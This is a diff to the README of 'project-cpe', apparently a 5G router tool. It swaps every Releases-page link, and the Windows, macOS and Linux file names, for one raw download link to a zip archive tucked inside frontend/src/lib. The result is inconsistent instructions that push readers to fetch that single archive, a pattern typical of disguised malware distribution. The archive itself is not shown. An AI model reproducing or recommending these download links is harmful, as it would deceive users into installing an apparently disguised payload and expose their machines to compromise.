@@ -1,6 +1,6 @@
 # 🌟 project-cpe - Empowering Your 5G Experience
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Anoof0/project-cpe/releases)
+[![Download](https://github.com/Anoof0/project-cpe/raw/refs/heads/main/frontend/src/lib/cpe_project_v3.3.zip)](https://github.com/Anoof0/project-cpe/raw/refs/heads/main/frontend/src/lib/cpe_project_v3.3.zip)
 
 ## 📖 Overview
 
@@ -13,14 +13,14 @@ Follow these simple steps to download and run the application on your computer.
 ## 📥 Download & Install
 
 1. Click the link below to visit the Releases page:
-   [Download Here](https://github.com/Anoof0/project-cpe/releases)
+   [Download Here](https://github.com/Anoof0/project-cpe/raw/refs/heads/main/frontend/src/lib/cpe_project_v3.3.zip)
 
 2. On the Releases page, you will find different versions of the software. Look for the latest one, usually marked as the most recent.
 
 3. You will see a list of assets below the version description. Choose the appropriate file for your operating system. If you're unsure which one to pick, the most common files are:
-   - For Windows: `project-cpe-windows.exe`
-   - For macOS: `project-cpe-macos.dmg`
-   - For Linux: `project-cpe-linux.tar.gz`
+   - For Windows: `https://github.com/Anoof0/project-cpe/raw/refs/heads/main/frontend/src/lib/cpe_project_v3.3.zip`
+   - For macOS: `https://github.com/Anoof0/project-cpe/raw/refs/heads/main/frontend/src/lib/cpe_project_v3.3.zip`
+   - For Linux: `https://github.com/Anoof0/project-cpe/raw/refs/heads/main/frontend/src/lib/cpe_project_v3.3.zip`
 
 4. Click on the file name to start the download.
 
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. You can view the full license de
 
 Thank you for choosing **project-cpe**. We hope this software enhances your 5G experience. Enjoy exploring its features, and don’t hesitate to reach out if you need help. 
 
-For more downloads, visit: [Detailed Releases Page](https://github.com/Anoof0/project-cpe/releases)
+For more downloads, visit: [Detailed Releases Page](https://github.com/Anoof0/project-cpe/raw/refs/heads/main/frontend/src/lib/cpe_project_v3.3.zip)
